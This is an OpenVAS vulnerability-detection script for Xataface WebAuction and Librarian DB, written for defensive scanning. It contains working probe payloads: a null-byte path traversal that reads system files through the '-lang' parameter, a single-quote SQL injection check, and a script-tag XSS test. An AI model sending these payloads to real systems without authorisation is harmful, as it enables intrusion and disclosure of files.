###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xadataface_webauction_n_librariandb_mult_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801981");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=350");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17813");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_Xataface_Webauction_Mult_Vuln.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
  arbitrary HTML code in a user's browser session in the context of a vulnerable
  application or to manipulate SQL queries by injecting arbitrary SQL code or to
  include arbitrary files from external and local resources.");
  script_tag(name:"affected", value:"Xataface WebAuction Version 0.3.6 and prior.
  Xataface Librarian DB version 0.2 and prior.");
  script_tag(name:"insight", value:"Multiple flaws are due to  input passed to the,

  - '-action' parameter in 'index.php' is not properly verified. This can be
  exploited to read complete installation path.

  - 'list&-table' and '-action' parameter in 'index.php' page is not properly
  verified before being used in an SQL query. This can  be exploited to
  manipulate SQL queries by injecting arbitrary SQL queries.

  - '-action' and 'list&-table' parameter in 'index.php'  page is not properly
  verified before it is returned to the user. This can be exploited to
  execute arbitrary HTML and script code in a user's browser session in the
  context of a vulnerable site.

  - 'list&-lang' and '-table' parameter in 'index.php' page is not properly
  verified before it is returned to the user. This can be exploited to
  execute arbitrary HTML and script code in a user's browser session in the
  context of a vulnerable site.

  - 'list&-lang' parameter in 'index.php' is not properly verified before
  using it to include files. This can be exploited to include arbitrary
  files from external and local resources.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Xataface WebAuction/Librarian DB and is prone
  multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/webauction", "/librariandb", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if('>WebAuction</' >< res || "Books - Dataface Application<" >< res)
  {
    files = traversal_files();
    foreach file (keys(files))
    {
      url = string(dir, "/index.php?-table=books&-action=browse_by_cat&-curs" +
                   "or=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../." +
                   "./../../../", files[file],'%00');

      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_message(port:port);
        exit(0);
      }
    }

    req = http_get(item:string(dir,"/index.php?-table='"), port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    if("The mysql error returned was" >< res)
    {
      security_message(port:port);
      exit(0);
    }

    req = http_get(item:string(dir, '/index.php?-table=books&-action=browse_' +
                   'by_cat&-cursor=0&-skip=0&-limit=30&-mode=list&-lang="<sc' +
                   'ript>alert("OpenVAS-XSS-TEST")</script>'), port:port);

    res = http_keepalive_send_recv(port:port,data:req);

    if(res =~ "HTTP/1\.. 200" && '<script>alert("OpenVAS-XSS-TEST")</script>' >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
